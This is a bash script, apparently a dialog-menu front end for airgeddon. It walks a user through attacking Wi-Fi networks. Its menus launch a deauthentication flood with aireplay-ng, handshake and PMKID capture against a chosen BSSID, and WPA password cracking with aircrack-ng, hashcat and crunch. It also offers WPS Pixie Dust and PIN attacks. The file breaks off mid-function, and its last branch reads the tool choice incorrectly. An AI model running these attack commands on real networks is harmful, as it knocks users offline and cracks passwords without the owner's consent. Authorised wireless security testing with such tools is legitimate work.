#!/usr/bin/env bash
#Title........: wireless_warlord.sh
#Description..: A modern, user-friendly wrapper for airgeddon with arrow key navigation and improved UI
#Author.......: Based on airgeddon.sh by v1s1t0r
#Version......: 1.0
#Usage........: bash wireless_warlord.sh

# Source the required libraries
scriptfolder="$(pwd)/"
source "${scriptfolder}ui_elements.sh"
source "${scriptfolder}error_handler.sh"
source "${scriptfolder}log_manager.sh"

# Trap for proper error handling
trap 'handle_exit' EXIT
trap 'handle_error ${LINENO}' ERR

# Global variables
WW_VERSION="1.0"
DIALOG_CANCEL=1
DIALOG_ESC=255
DIALOG_ITEM_HELP=2
DIALOG_EXTRA=3
HEIGHT=25
WIDTH=80

# Check if dialog is installed
check_dialog() {
    if ! command -v dialog &> /dev/null; then
        echo -e "${RED}Error: dialog is not installed.${NC}"
        echo -e "Please install dialog package with: ${YELLOW}sudo apt-get install dialog${NC}"
        exit 1
    fi
}

# Check if airgeddon.sh exists
check_airgeddon() {
    if [ ! -f "${scriptfolder}airgeddon.sh" ]; then
        echo -e "${RED}Error: airgeddon.sh not found in the current directory.${NC}"
        echo -e "Please make sure airgeddon.sh is in the same directory as wireless_warlord.sh${NC}"
        exit 1
    fi
}

# Initialize required directories
initialize_directories() {
    # Create logs directory if it doesn't exist
    if [ ! -d "logs" ]; then
        mkdir -p "logs"
    fi
}

# Display the welcome splash screen
show_splash_screen() {
    clear
    echo -e "${BOLD}${CYAN}"
    echo '  __      __.__                .__                        __      __              .__                     .___'
    echo '/  \    /  \__|______    ____ |  |    ____  ______ ______/  \    /  \______ _____ |  |   ___________   __| _/'
    echo '\   \/\/   /  \_  __ \  /  _ \|  |   /  _ \/  ___//  ___/\   \/\/   /  _ \\____ \|  |  /  _ \_  __ \ / __ | '
    echo ' \        /|  ||  | \/(  <_> )  |__(  <_> )___ \ \___ \  \        (  <_> )  |_> >  |_(  <_> )  | \// /_/ | '
    echo '  \__/\  / |__||__|    \____/|____/\____/____  >____  >  \__/\  / \____/|   __/|____/\____/|__|  \____ | '
    echo '       \/                                     \/     \/        \/        |__|                          \/ '
    echo -e "${NC}${YELLOW}                 A modern, user-friendly wireless network auditing tool ${NC}"
    echo -e "${GREEN}                             Version ${WW_VERSION} - Based on airgeddon ${NC}"
    echo 
    echo -e "${CYAN}Loading...${NC}"
    sleep 2
}

# Source airgeddon but override its interface functions
load_airgeddon() {
    # Source airgeddon with some overrides
    # We'll disable airgeddon's interface and replace it with ours
    
    # Override some airgeddon functions to integrate with our UI
    # We need to create these overrides before sourcing airgeddon
    
    # Create temp file with function overrides
    cat > "${scriptfolder}airgeddon_overrides.sh" << 'EOF'
# Function overrides for airgeddon.sh

# Override main menu function
function main_menu() {
    ww_main_menu
}

# Override language selection to use our UI
function language_menu() {
    ww_language_menu
}

# Override error handling
function handle_exit_pre() {
    ww_handle_exit
}

# Override the is_package_installed function to be quieter
function is_package_installed_prev() {
    is_package_installed "$@"
}

function is_package_installed() {
    is_package_installed_prev "$@" 2>/dev/null
}

# Override the interface selection
function select_interface() {
    ww_select_interface
}

# These will be implemented in the wireless_warlord.sh file
EOF

    # Source the overrides
    source "${scriptfolder}airgeddon_overrides.sh"
    
    # Now source airgeddon with overrides in place
    source "${scriptfolder}airgeddon.sh"
    
    # Remove temporary override file
    rm "${scriptfolder}airgeddon_overrides.sh"
}

# Main menu implementation using dialog
ww_main_menu() {
    initialize_log_session
    
    local exit_status
    
    while true; do
        exec 3>&1
        selection=$(dialog \
            --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "📡 Main Menu 📡" \
            --ok-label "Select" \
            --cancel-label "Exit" \
            --menu "Choose an operation:" \
            $HEIGHT $WIDTH 10 \
            "1" "🎯 Select Interface ${current_interface}" \
            "2" "🌐 Manage Monitor Mode" \
            "3" "🔍 Explore Networks" \
            "4" "🔑 Capture Handshake/PMKID" \
            "5" "⚡ Offline WPA Attacks" \
            "6" "📶 WPS Attacks" \
            "7" "📊 WEP Attacks" \
            "8" "⛓️ Evil Twin Attacks" \
            "9" "🏢 Enterprise Attacks" \
            "10" "💥 DoS Attacks" \
            "11" "🔧 Tools" \
            "12" "🌍 Language (${language})" \
            "13" "ℹ️ About" \
            2>&1 1>&3)
        exit_status=$?
        exec 3>&-
        
        case $exit_status in
            $DIALOG_CANCEL|$DIALOG_ESC)
                confirm_exit
                ;;
        esac
        
        # Process selection
        case $selection in
            1) ww_select_interface ;;
            2) manage_monitor_mode ;;
            3) explore_networks ;;
            4) capture_handshake_menu ;;
            5) offline_attacks_menu ;;
            6) wps_attacks_menu ;;
            7) wep_attacks_menu ;;
            8) evil_twin_attacks_menu ;;
            9) enterprise_attacks_menu ;;
            10) dos_attacks_menu ;;
            11) tools_menu ;;
            12) ww_language_menu ;;
            13) about_menu ;;
            *) show_error "Invalid option" ;;
        esac
    done
}

# Confirm exit dialog
confirm_exit() {
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🚪 Exit" \
        --yesno "Are you sure you want to exit Wireless Warlord?" \
        8 40
        
    local choice=$?
    
    if [ $choice -eq 0 ]; then
        clear
        echo -e "${GREEN}Thank you for using Wireless Warlord!${NC}"
        echo -e "${CYAN}Logs saved in: ${log_session_dir}${NC}"
        echo
        exit 0
    fi
}

# Interface selection menu
ww_select_interface() {
    local interfaces=()
    local interface_info
    local available_interfaces=$(get_available_interfaces)
    
    for iface in $available_interfaces; do
        interface_info=$(get_interface_info "$iface")
        interfaces+=("$iface" "$interface_info")
    done
    
    exec 3>&1
    selected_interface=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🎯 Select Wireless Interface" \
        --ok-label "Select" \
        --cancel-label "Back" \
        --menu "Choose an interface:" \
        $HEIGHT $WIDTH 10 \
        "${interfaces[@]}" \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
        interface=$selected_interface
        current_interface="($interface)"
        # Call airgeddon's interface validation
        check_interface_mode "$interface"
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "✅ Interface Selected" \
            --msgbox "Interface $interface has been selected." \
            8 40
    fi
}

# Function to get interface info (combines airgeddon functionality)
get_interface_info() {
    local interface=$1
    local info
    
    # Get interface chipset using airgeddon function
    local chipset=$(get_interface_chipset "$interface" 2>/dev/null)
    
    # Get interface mode
    local mode=$(get_interface_mode "$interface" 2>/dev/null)
    
    info="${mode} | ${chipset}"
    echo "$info"
}

# Function to get all available interfaces
get_available_interfaces() {
    # Use airgeddon's function
    ifacemode="managed"
    interface=""
    get_available_interfaces_prev
}

# Language menu implementation
ww_language_menu() {
    local language_options=()
    
    # Add all languages from the lang_association array in airgeddon
    for lang_key in "${!lang_association[@]}"; do
        language_options+=("${lang_association[$lang_key]}" "[$lang_key]")
    done
    
    exec 3>&1
    local selected_language=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🌍 Language Selection" \
        --ok-label "Select" \
        --cancel-label "Back" \
        --menu "Choose your language:" \
        $HEIGHT $WIDTH 10 \
        "${language_options[@]}" \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
        language=$selected_language
        set_language
        initialize_language_strings
        
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "✅ Language Selected" \
            --msgbox "Language has been set to: $language" \
            8 40
    fi
}

# Manage monitor mode menu
manage_monitor_mode() {
    if [ -z "$interface" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "⚠️ No Interface Selected" \
            --msgbox "Please select an interface first." \
            8 40
        return
    fi
    
    local current_mode=$(get_interface_mode "$interface")
    local options=()
    
    if [ "$current_mode" = "managed" ]; then
        options+=("1" "🔋 Enable Monitor Mode")
    else
        options+=("1" "🔋 Disable Monitor Mode")
    fi
    
    options+=("2" "📊 Show Interface Details")
    
    exec 3>&1
    local selection=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "📶 Manage Monitor Mode" \
        --ok-label "Select" \
        --cancel-label "Back" \
        --menu "Current interface: $interface ($current_mode)" \
        $HEIGHT $WIDTH 10 \
        "${options[@]}" \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
        case $selection in
            1)
                if [ "$current_mode" = "managed" ]; then
                    # Call airgeddon's function to enable monitor mode
                    exec_airmon_ng start "$interface" | dialog --programbox "Enabling monitor mode..." 20 70
                    local new_interface=$(get_monitor_mode_interface "$interface")
                    if [ -n "$new_interface" ]; then
                        interface=$new_interface
                        current_interface="($interface)"
                    fi
                else
                    # Call airgeddon's function to disable monitor mode
                    exec_airmon_ng stop "$interface" | dialog --programbox "Disabling monitor mode..." 20 70
                    local new_interface=$(get_managed_mode_interface "$interface")
                    if [ -n "$new_interface" ]; then
                        interface=$new_interface
                        current_interface="($interface)"
                    fi
                fi
                ;;
            2)
                # Show detailed interface information
                local interface_details=$(get_detailed_interface_info "$interface")
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📡 Interface Details" \
                    --msgbox "$interface_details" \
                    20 70
                ;;
        esac
    fi
}

# Explore networks menu (Scan for wifi networks)
explore_networks() {
    if [ -z "$interface" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "⚠️ No Interface Selected" \
            --msgbox "Please select an interface first." \
            8 40
        return
    fi
    
    local interface_mode=$(get_interface_mode "$interface")
    if [ "$interface_mode" != "monitor" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "⚠️ Wrong Interface Mode" \
            --yesno "Interface must be in monitor mode. Would you like to enable monitor mode now?" \
            8 60
            
        if [ $? -eq 0 ]; then
            exec_airmon_ng start "$interface" | dialog --programbox "Enabling monitor mode..." 20 70
            local new_interface=$(get_monitor_mode_interface "$interface")
            if [ -n "$new_interface" ]; then
                interface=$new_interface
                current_interface="($interface)"
            else
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "❌ Error" \
                    --msgbox "Failed to enable monitor mode." \
                    8 40
                return
            fi
        else
            return
        fi
    fi
    
    # Options for exploration
    exec 3>&1
    local selection=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🔍 Explore Networks" \
        --ok-label "Select" \
        --cancel-label "Back" \
        --menu "Choose scan type:" \
        $HEIGHT $WIDTH 10 \
        "1" "📶 Regular Scan" \
        "2" "📡 WPS Networks Scan" \
        "3" "📱 Show Connected Clients" \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
        case $selection in
            1)
                # Use airgeddon functions to perform regular scan
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📶 Regular Network Scan" \
                    --msgbox "A new window will open with airodump-ng.\n\nPress Ctrl+C in that window when done scanning." \
                    10 60
                
                # Create temporary file for airodump output
                local temp_file=$(mktemp -p "$log_session_dir" airodump_XXXXXX.txt)
                
                # Launch airodump-ng in a new terminal
                xterm -title "Wireless Warlord - Network Scan" -bg black -fg green -e "airodump-ng $interface -w '$log_session_dir/scan' | tee $temp_file" &
                ;;
            2)
                # Scan for WPS networks
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📡 WPS Network Scan" \
                    --msgbox "A new window will open to scan for WPS networks.\n\nPress Ctrl+C in that window when done scanning." \
                    10 60
                
                # Launch wash in a new terminal
                xterm -title "Wireless Warlord - WPS Scan" -bg black -fg green -e "wash -i $interface | tee '$log_session_dir/wps_scan.txt'" &
                ;;
            3)
                # Show connected clients
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📱 Client Scan" \
                    --msgbox "Please enter BSSID of target AP in the next screen." \
                    8 40
                
                # Ask for BSSID
                exec 3>&1
                local target_bssid=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🎯 Target Selection" \
                    --inputbox "Enter BSSID of target AP (XX:XX:XX:XX:XX:XX):" \
                    8 60 \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
                    # Launch airodump-ng to show clients
                    xterm -title "Wireless Warlord - Client Scan" -bg black -fg green -e "airodump-ng $interface --bssid $target_bssid -w '$log_session_dir/client_scan'" &
                fi
                ;;
        esac
    fi
}

# Capture handshake/PMKID menu
capture_handshake_menu() {
    if [ -z "$interface" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "⚠️ No Interface Selected" \
            --msgbox "Please select an interface first." \
            8 40
        return
    fi
    
    local interface_mode=$(get_interface_mode "$interface")
    if [ "$interface_mode" != "monitor" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "⚠️ Wrong Interface Mode" \
            --yesno "Interface must be in monitor mode. Would you like to enable monitor mode now?" \
            8 60
            
        if [ $? -eq 0 ]; then
            exec_airmon_ng start "$interface" | dialog --programbox "Enabling monitor mode..." 20 70
            local new_interface=$(get_monitor_mode_interface "$interface")
            if [ -n "$new_interface" ]; then
                interface=$new_interface
                current_interface="($interface)"
            else
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "❌ Error" \
                    --msgbox "Failed to enable monitor mode." \
                    8 40
                return
            fi
        else
            return
        fi
    fi
    
    # Capture options
    exec 3>&1
    local selection=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🔑 Capture Handshake/PMKID" \
        --ok-label "Select" \
        --cancel-label "Back" \
        --menu "Choose capture method:" \
        $HEIGHT $WIDTH 10 \
        "1" "🔄 Standard Handshake Capture" \
        "2" "🔐 PMKID Capture" \
        "3" "💣 Deauthentication Attack + Capture" \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
        case $selection in
            1)
                capture_handshake "standard"
                ;;
            2)
                capture_handshake "pmkid"
                ;;
            3)
                capture_handshake "deauth"
                ;;
        esac
    fi
}

# Function to capture handshake with different methods
capture_handshake() {
    local method=$1
    local target_bssid
    local target_channel
    local target_essid
    
    # First scan for networks
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "📶 Network Scan" \
        --msgbox "A new window will open to scan for networks.\n\nPress Ctrl+C in that window when you see your target network." \
        10 60
    
    # Launch airodump-ng for target selection
    xterm -title "Wireless Warlord - Network Scan" -bg black -fg green -e "airodump-ng $interface -w '$log_session_dir/targets'" &
    local scan_pid=$!
    
    # Wait for user to select a network
    sleep 2
    
    # Ask for target information
    exec 3>&1
    target_bssid=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🎯 Target Selection" \
        --inputbox "Enter BSSID of target network:" \
        8 60 \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
        kill $scan_pid 2>/dev/null
        return
    fi
    
    exec 3>&1
    target_channel=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🎯 Target Selection" \
        --inputbox "Enter channel of target network:" \
        8 60 \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
        kill $scan_pid 2>/dev/null
        return
    fi
    
    exec 3>&1
    target_essid=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🎯 Target Selection" \
        --inputbox "Enter ESSID (name) of target network:" \
        8 60 \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
        kill $scan_pid 2>/dev/null
        return
    fi
    
    # Kill the scanning process
    kill $scan_pid 2>/dev/null
    
    case $method in
        "standard")
            # Launch airodump-ng to capture handshake
            dialog --clear \
                --backtitle "Wireless Warlord ${WW_VERSION}" \
                --title "🔑 Handshake Capture" \
                --msgbox "A new window will open to capture the handshake.\n\nWait for a client to connect or disconnect.\n\nPress Ctrl+C when done." \
                10 60
            
            xterm -title "Wireless Warlord - Handshake Capture" -bg black -fg green -e "airodump-ng $interface --bssid $target_bssid -c $target_channel -w '$log_session_dir/handshake'" &
            ;;
        "pmkid")
            # Launch hcxdumptool to capture PMKID
            dialog --clear \
                --backtitle "Wireless Warlord ${WW_VERSION}" \
                --title "🔐 PMKID Capture" \
                --msgbox "A new window will open to capture PMKID.\n\nThis may take a few minutes.\n\nPress Ctrl+C when done." \
                10 60
            
            xterm -title "Wireless Warlord - PMKID Capture" -bg black -fg green -e "hcxdumptool -i $interface -o '$log_session_dir/pmkid.pcapng' --enable_status=1 -c $target_channel" &
            ;;
        "deauth")
            # Launch airodump-ng to capture handshake
            dialog --clear \
                --backtitle "Wireless Warlord ${WW_VERSION}" \
                --title "💣 Deauth + Capture" \
                --msgbox "Two windows will open:\n1. To capture the handshake\n2. To send deauthentication packets\n\nPress Ctrl+C in both windows when done." \
                10 60
            
            # Start airodump-ng for handshake capture
            xterm -title "Wireless Warlord - Handshake Capture" -bg black -fg green -e "airodump-ng $interface --bssid $target_bssid -c $target_channel -w '$log_session_dir/handshake'" &
            
            # Wait a moment before launching deauth
            sleep 2
            
            # Start aireplay-ng for deauth
            xterm -title "Wireless Warlord - Deauth Attack" -bg black -fg red -e "aireplay-ng --deauth 5 -a $target_bssid $interface" &
            ;;
    esac
    
    # Save target info for later use
    echo "$target_bssid" > "$log_session_dir/target_bssid.txt"
    echo "$target_channel" > "$log_session_dir/target_channel.txt"
    echo "$target_essid" > "$log_session_dir/target_essid.txt"
    
    # Show notification after a delay
    sleep 10
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "💾 Capture Information" \
        --msgbox "Capture in progress.\n\nAll files will be saved to:\n$log_session_dir" \
        10 60
}

# Function for offline WPA attacks menu
offline_attacks_menu() {
    exec 3>&1
    local selection=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "⚡ Offline WPA Attacks" \
        --ok-label "Select" \
        --cancel-label "Back" \
        --menu "Choose attack method:" \
        $HEIGHT $WIDTH 10 \
        "1" "📚 Dictionary Attack (Aircrack-ng)" \
        "2" "🔥 GPU Attack (Hashcat)" \
        "3" "🧠 Bruteforce Attack" \
        "4" "📋 Convert Capture Format" \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
        # First, select capture file
        exec 3>&1
        local capture_file=$(dialog \
            --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "📂 Select Capture File" \
            --inputbox "Enter path to capture file (.cap or .hccapx):" \
            8 60 \
            "$log_session_dir/handshake-01.cap" \
            2>&1 1>&3)
        exit_status=$?
        exec 3>&-
        
        if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
            return
        fi
        
        case $selection in
            1)
                # Dictionary attack with aircrack-ng
                exec 3>&1
                local wordlist=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📚 Dictionary Selection" \
                    --inputbox "Enter path to wordlist:" \
                    8 60 \
                    "/usr/share/wordlists/rockyou.txt" \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
                    xterm -title "Wireless Warlord - Dictionary Attack" -bg black -fg green -e "aircrack-ng $capture_file -w $wordlist | tee '$log_session_dir/dictionary_attack.log'" &
                fi
                ;;
            2)
                # GPU attack with hashcat
                exec 3>&1
                local wordlist=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📚 Dictionary Selection" \
                    --inputbox "Enter path to wordlist:" \
                    8 60 \
                    "/usr/share/wordlists/rockyou.txt" \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
                    # Check if file needs conversion
                    if [[ "$capture_file" == *.cap ]]; then
                        dialog --clear \
                            --backtitle "Wireless Warlord ${WW_VERSION}" \
                            --title "🔄 Format Conversion" \
                            --msgbox "CAP file will be converted to HCCAPX format for Hashcat." \
                            8 60
                            
                        local hccapx_file="${capture_file%.cap}.hccapx"
                        xterm -title "Wireless Warlord - File Conversion" -bg black -fg yellow -e "cap2hccapx $capture_file $hccapx_file" &
                        local convert_pid=$!
                        wait $convert_pid
                        capture_file=$hccapx_file
                    fi
                    
                    xterm -title "Wireless Warlord - Hashcat Attack" -bg black -fg green -e "hashcat -m 2500 $capture_file $wordlist -o '$log_session_dir/hashcat_result.txt' | tee '$log_session_dir/hashcat_attack.log'" &
                fi
                ;;
            3)
                # Bruteforce attack
                exec 3>&1
                local charset=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🧠 Bruteforce Settings" \
                    --radiolist "Select character set:" \
                    15 60 6 \
                    "1" "Lowercase [a-z]" ON \
                    "2" "Uppercase [A-Z]" OFF \
                    "3" "Numbers [0-9]" OFF \
                    "4" "Special [!@#$%...]" OFF \
                    "5" "Mixed (Alpha + Numbers)" OFF \
                    "6" "All Characters" OFF \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                    return
                fi
                
                exec 3>&1
                local min_length=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🧠 Bruteforce Settings" \
                    --inputbox "Enter minimum password length:" \
                    8 60 \
                    "8" \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                    return
                fi
                
                exec 3>&1
                local max_length=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🧠 Bruteforce Settings" \
                    --inputbox "Enter maximum password length:" \
                    8 60 \
                    "8" \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
                    local charset_string=""
                    case $charset in
                        1) charset_string="abcdefghijklmnopqrstuvwxyz" ;;
                        2) charset_string="ABCDEFGHIJKLMNOPQRSTUVWXYZ" ;;
                        3) charset_string="0123456789" ;;
                        4) charset_string="!@#$%^&*()_+-={}[]|:;<>,.?/" ;;
                        5) charset_string="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" ;;
                        6) charset_string="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-={}[]|:;<>,.?/" ;;
                    esac
                    
                    # Warning about bruteforce time
                    dialog --clear \
                        --backtitle "Wireless Warlord ${WW_VERSION}" \
                        --title "⚠️ Warning" \
                        --msgbox "Bruteforce attacks can take a VERY long time depending on the settings.\n\nPress OK to continue or Ctrl+C in the attack window to cancel." \
                        10 60
                    
                    # Generate wordlist with crunch and pipe to aircrack-ng
                    xterm -title "Wireless Warlord - Bruteforce Attack" -bg black -fg green -e "crunch $min_length $max_length $charset_string | aircrack-ng -w - $capture_file | tee '$log_session_dir/bruteforce_attack.log'" &
                fi
                ;;
            4)
                # Convert capture format
                exec 3>&1
                local format=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🔄 Format Conversion" \
                    --radiolist "Convert to format:" \
                    10 60 3 \
                    "1" "CAP to HCCAPX (Hashcat)" ON \
                    "2" "HCCAPX to CAP" OFF \
                    "3" "PCAPNG to HCWPAX (PMKID)" OFF \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
                    case $format in
                        1)
                            local output_file="${capture_file%.cap}.hccapx"
                            xterm -title "Wireless Warlord - Format Conversion" -bg black -fg yellow -e "cap2hccapx $capture_file $output_file && echo 'Converted to: $output_file' || echo 'Conversion failed'" &
                            ;;
                        2)
                            local output_file="${capture_file%.hccapx}.cap"
                            xterm -title "Wireless Warlord - Format Conversion" -bg black -fg yellow -e "echo 'HCCAPX to CAP conversion is not directly supported. Use other tools like hcxpcapngtool.'" &
                            ;;
                        3)
                            local output_file="${capture_file%.pcapng}.hcwpax"
                            xterm -title "Wireless Warlord - Format Conversion" -bg black -fg yellow -e "hcxpcapngtool -o $output_file $capture_file && echo 'Converted to: $output_file' || echo 'Conversion failed'" &
                            ;;
                    esac
                fi
                ;;
        esac
    fi
}

# Function for WPS attacks menu
wps_attacks_menu() {
    if [ -z "$interface" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "⚠️ No Interface Selected" \
            --msgbox "Please select an interface first." \
            8 40
        return
    fi
    
    local interface_mode=$(get_interface_mode "$interface")
    if [ "$interface_mode" != "monitor" ]; then
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "⚠️ Wrong Interface Mode" \
            --yesno "Interface must be in monitor mode. Would you like to enable monitor mode now?" \
            8 60
            
        if [ $? -eq 0 ]; then
            exec_airmon_ng start "$interface" | dialog --programbox "Enabling monitor mode..." 20 70
            local new_interface=$(get_monitor_mode_interface "$interface")
            if [ -n "$new_interface" ]; then
                interface=$new_interface
                current_interface="($interface)"
            else
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "❌ Error" \
                    --msgbox "Failed to enable monitor mode." \
                    8 40
                return
            fi
        else
            return
        fi
    fi
    
    exec 3>&1
    local selection=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "📶 WPS Attacks" \
        --ok-label "Select" \
        --cancel-label "Back" \
        --menu "Choose attack method:" \
        $HEIGHT $WIDTH 10 \
        "1" "🔍 Scan for WPS Networks" \
        "2" "🔑 Pixie Dust Attack" \
        "3" "🔢 PIN Bruteforce Attack" \
        "4" "📡 Null PIN Attack" \
        "5" "📋 Custom PIN Attack" \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
        case $selection in
            1)
                # Scan for WPS networks
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🔍 WPS Network Scan" \
                    --msgbox "A new window will open to scan for WPS networks.\n\nPress Ctrl+C in that window when done scanning." \
                    10 60
                
                xterm -title "Wireless Warlord - WPS Scan" -bg black -fg green -e "wash -i $interface | tee '$log_session_dir/wps_scan.txt'" &
                ;;
            2|3|4|5)
                # For all WPS attacks, we need target information
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🎯 Target Selection" \
                    --msgbox "You will need to select a target AP with WPS enabled." \
                    8 40
                
                # First scan for WPS networks
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🔍 WPS Network Scan" \
                    --msgbox "A new window will open to scan for WPS networks.\n\nPress Ctrl+C in that window when you see your target AP." \
                    10 60
                
                xterm -title "Wireless Warlord - WPS Scan" -bg black -fg green -e "wash -i $interface | tee '$log_session_dir/wps_scan.txt'" &
                local scan_pid=$!
                sleep 3
                
                # Ask for target BSSID
                exec 3>&1
                local target_bssid=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🎯 Target Selection" \
                    --inputbox "Enter BSSID of target AP:" \
                    8 60 \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                    kill $scan_pid 2>/dev/null
                    return
                fi
                
                # Ask for target channel
                exec 3>&1
                local target_channel=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🎯 Target Selection" \
                    --inputbox "Enter channel of target AP:" \
                    8 60 \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                    kill $scan_pid 2>/dev/null
                    return
                fi
                
                # Kill the scanning process
                kill $scan_pid 2>/dev/null
                
                # Perform the selected attack
                case $selection in
                    2)
                        # Pixie Dust attack
                        dialog --clear \
                            --backtitle "Wireless Warlord ${WW_VERSION}" \
                            --title "🔑 Pixie Dust Attack" \
                            --radiolist "Select tool:" \
                            10 60 2 \
                            "1" "Reaver" ON \
                            "2" "Bully" OFF \
                            2>&1 1>&3
                        local tool=$?
                        
                        if [ $tool -eq 0 ]; then
